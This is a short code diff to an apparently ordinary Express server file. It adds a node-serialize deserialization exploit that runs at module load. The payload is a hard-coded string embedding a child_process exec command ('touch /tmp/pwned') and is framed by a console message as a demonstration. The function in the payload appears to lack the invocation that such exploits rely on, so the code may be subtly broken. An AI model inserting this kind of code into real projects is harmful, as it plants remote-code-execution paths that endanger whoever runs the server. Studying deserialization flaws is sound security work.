@@ -1,4 +1,9 @@
 const express = require('express');
+const serialize = require('node-serialize');
+
+const evilPayload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'touch /tmp/pwned\', function(error, stdout, stderr){console.log(stdout)});}"}';
+console.log("Demonstrating insecure deserialization. This is a critical vulnerability!");
+serialize.unserialize(evilPayload);
 const axios = require('axios');
 const cors = require('cors');
 
